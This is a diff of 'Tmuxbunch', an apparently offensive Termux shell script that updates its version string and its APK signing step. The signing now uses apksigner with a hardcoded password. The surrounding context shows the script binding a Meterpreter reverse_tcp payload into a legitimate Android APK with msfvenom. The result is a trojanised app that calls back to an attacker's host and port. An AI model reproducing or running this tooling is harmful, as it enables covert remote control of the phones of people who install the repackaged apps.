@@ -17,7 +17,7 @@ reset='\033[0m'
 #################
 if [ "${1}" = "-h" ]
 then
-printf "$yellow  \n Tmuxbunch v2.4\n\n$blue  -d /path/to/apkname.apk For decompiling\n  -r For recompiling\n  -s For signing\n  -b For binding payload\n  -z For zipalign\n$reset"
+printf "$yellow  \n Tmuxbunch v2.7-Oreo\n\n$blue  -d /path/to/apkname.apk For decompiling\n  -r For recompiling\n  -s For signing\n  -b For binding payload\n  -z For zipalign\n$reset"
 
 
 #################
@@ -41,7 +41,8 @@ cd $HOME/metasploit-framework
 ./msfvenom -x ${2} -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport
 echo -e "$green signing apk ......."
 mv $dir/unsign/output.apk $dir/unsign/$output12.apk
-sh $dir/.signapk publickey.x509.pem publickey.pk8 $dir/unsign/$output12.apk $dir/embout/$output12.apk
+#sh $dir/.signapk publickey.x509.pem publickey.pk8 $dir/unsign/$output12.apk $dir/embout/$output12.apk
+apksigner -p hax4us keystore $dir/unsign/$output12.apk $dir/embout/$output12.apk
 rm $dir/unsign/$output12.apk
 echo
 echo -e "$cyan We will met again :D , have a payload day..! 📢"
@@ -148,7 +149,8 @@ exit
 else
 echo -e "$green signing apk ......."
 OUTPUT=`ls | sed -n $choice'p'`
-sh $dir/.signapk publickey.x509.pem publickey.pk8 $dir/unsign/$OUTPUT $dir/sign/signed_$OUTPUT
+#sh $dir/.signapk publickey.x509.pem publickey.pk8 $dir/unsign/$OUTPUT $dir/sign/signed_$OUTPUT
+apksigner -p hax4us keystore $dir/unsign/$OUTPUT $dir/sign/signed_$OUTPUT
 echo
 echo
 echo -e "$blue _______________________________________"
